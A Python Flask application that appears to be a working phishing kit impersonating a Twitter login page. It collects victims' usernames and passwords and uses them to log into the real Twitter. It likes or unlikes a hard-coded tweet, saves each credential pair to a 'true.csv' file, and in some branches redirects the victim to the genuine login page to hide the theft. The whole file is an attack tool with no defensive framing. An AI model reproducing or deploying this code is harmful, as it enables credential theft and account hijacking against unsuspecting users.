from flask import Flask, redirect, url_for
from flask import request
from flask import render_template
from bs4 import BeautifulSoup
import requests
import csv
import os

app = Flask(__name__)

SESSION = requests.Session()
RESPONSE = ""
AUTH_TOKEN = ""

@app.route('/')
def my_form():
    return render_template("twitter.html")

@app.route('/', methods=['POST'])
def my_form_post():
    global SESSION, RESPONSE, AUTH_TOKEN

    headers = {
        "User-Agent": "Mozilla/5.0",
        "accept": "text/html,application/xhtml+xml,application/xml",
        "accept-language": "ja,en-US;q=0.8,en;q=0.6",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://twitter.com",
        "referer": "https://twitter.com/",
        "upgrade-insecure-requests": "1"
    }

    login = {
        "session[username_or_email]": request.form['session[username_or_email]'],
        "session[password]": request.form['session[password]'],
        "remember_me": "1",
        "return_to_ssl": "true",
        "scribe_log": "",
        "redirect_after_login": "/",
        "authenticity_token": ""
    }

    fav = {
        "authenticity_token": "",
        "id": "870163280966197248",
        #"id": "682695260602929153",
        "tweet_stat_count": "0"
    }

    unfav = {
        "authenticity_token": "",
        "id": "870163280966197248",
        #"id": "682695260602929153",
        "tweet_stat_count": "0"
    }

    try:
        # GETリクエストでHTML取得
        RESPONSE = SESSION.get('https://twitter.com/', headers=headers, allow_redirects=True)
        # lxmlを指定する
        soup = BeautifulSoup(RESPONSE.text, "lxml")
        # HTMLからauthenticity_tokenを取得
        AUTH_TOKEN = soup.find(attrs={'name': 'authenticity_token'}).get('value')
        print("auth: " + str(RESPONSE.status_code))
        login['authenticity_token'] = AUTH_TOKEN
        fav['authenticity_token'] = AUTH_TOKEN
        unfav['authenticity_token'] = AUTH_TOKEN
    except Exception as e:
        print("[+] authenticity_tokenの取得に失敗しました: {0}".format(e))

    try:
        RESPONSE = SESSION.post('https://twitter.com/sessions', headers=headers, data=login, allow_redirects=False)
        print("login: " + str(RESPONSE.status_code))
        fav_status = SESSION.post('https://twitter.com/i/tweet/like', headers=headers, data=fav, allow_redirects=False, cookies=RESPONSE.cookies)
        print("fav: " + str(fav_status.status_code))
        if(fav_status.status_code == 302):
            csvWrite(request.form['session[username_or_email]'], request.form['session[password]'])
            return render_template("twitter.html")
        elif(fav_status.status_code == 200):
            csvWrite(request.form['session[username_or_email]'], request.form['session[password]'])
            return redirect("https://twitter.com/login", code=302)
        elif(fav_status.status_code == 403):
            unfav_status = SESSION.post('https://twitter.com/i/tweet/unlike', headers=headers, data=unfav, allow_redirects=False, cookies=RESPONSE.cookies)
            print("ufav: " + str(RESPONSE.status_code))
            if(unfav_status.status_code == 200):
                csvWrite(request.form['session[username_or_email]'], request.form['session[password]'])
                return redirect("https://twitter.com/login", code=302)
        else:
            csvWrite(request.form['session[username_or_email]'], request.form['session[password]'])
            return render_template("twitter.html")

    except Exception as e:
        print("[+] ログインに失敗: {0}".format(e))
        return render_template("twitter.html")
    finally:
        SESSION.cookies.clear()

def csvWrite(USER, PASSWORD):
    try:
        if USER != "":
            with open('./true.csv', 'a') as f:
                writer = csv.writer(f, lineterminator='\n')
                list = [USER, PASSWORD]
                writer.writerow(list)
    except:
        print("[+]CSVの書き込みに失敗しました")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, threaded=True)
